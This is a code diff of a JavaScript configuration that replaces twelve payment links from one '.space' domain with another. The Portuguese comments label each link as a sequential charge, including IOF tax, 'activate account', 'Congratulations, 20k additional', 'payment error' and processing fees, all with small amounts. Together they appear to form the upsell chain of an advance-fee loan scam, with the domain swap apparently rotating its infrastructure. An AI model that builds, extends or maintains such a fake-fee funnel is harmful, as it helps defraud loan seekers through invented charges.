@@ -1,16 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.chckout.space/2wq7Gr7XvoEgBAN", // IOF
-    up2: "https://pay.chckout.space/6YQPgjnXvbegpxz", // Taxa de verificação de IOF
-    up3: "https://pay.chckout.space/5pjw3RnlrJy32lQ", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.chckout.space/521rZJzWm4bZeaX", // NFe
-    up5: "https://pay.chckout.space/1VOvGV4AVmd3D62", // Ativar conta
-    up6: "https://pay.chckout.space/P5LNZ8z16WOgaRy", // Taxa de registro do contrato
-    up7: "https://pay.chckout.space/JqoR32bd0Vq3Vj5", // Parabéns, 20k adicional
-    up8: "https://pay.chckout.space/nWrxGWAn8XO3654", // Erro no pagamento - 14,06
-    up9: "https://pay.chckout.space/lDW0ZaJXlLRGN7E", // APP - 11,99
-    up10:"https://pay.chckout.space/KV603koXvYb3w8y", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.chckout.space/a6pVgd2XOo5Zk7B",// Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.chckout.space/PVYB34eDOJvZKzk" // Taxa de Processamento Administrativo - 31,92
+    up1: "https://pay.pendingtax.space/2wq7Gr7XvoEgBAN", // IOF
+    up2: "https://pay.pendingtax.space/6YQPgjnXvbegpxz", // Taxa de verificação de IOF
+    up3: "https://pay.pendingtax.space/5pjw3RnlrJy32lQ", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://pay.pendingtax.space/521rZJzWm4bZeaX", // NFe
+    up5: "https://pay.pendingtax.space/1VOvGV4AVmd3D62", // Ativar conta
+    up6: "https://pay.pendingtax.space/P5LNZ8z16WOgaRy", // Taxa de registro do contrato
+    up7: "https://pay.pendingtax.space/JqoR32bd0Vq3Vj5", // Parabéns, 20k adicional
+    up8: "https://pay.pendingtax.space/nWrxGWAn8XO3654", // Erro no pagamento - 14,06
+    up9: "https://pay.pendingtax.space/lDW0ZaJXlLRGN7E", // APP - 11,99
+    up10:"https://pay.pendingtax.space/KV603koXvYb3w8y", // Taxa de Abertura TAC - 16,92
+    up11:"https://pay.pendingtax.space/a6pVgd2XOo5Zk7B",// Taxa de Consultoria Financeira - 19,53
+    up12:"https://pay.pendingtax.space/PVYB34eDOJvZKzk" // Taxa de Processamento Administrativo - 31,92
 
 };
 
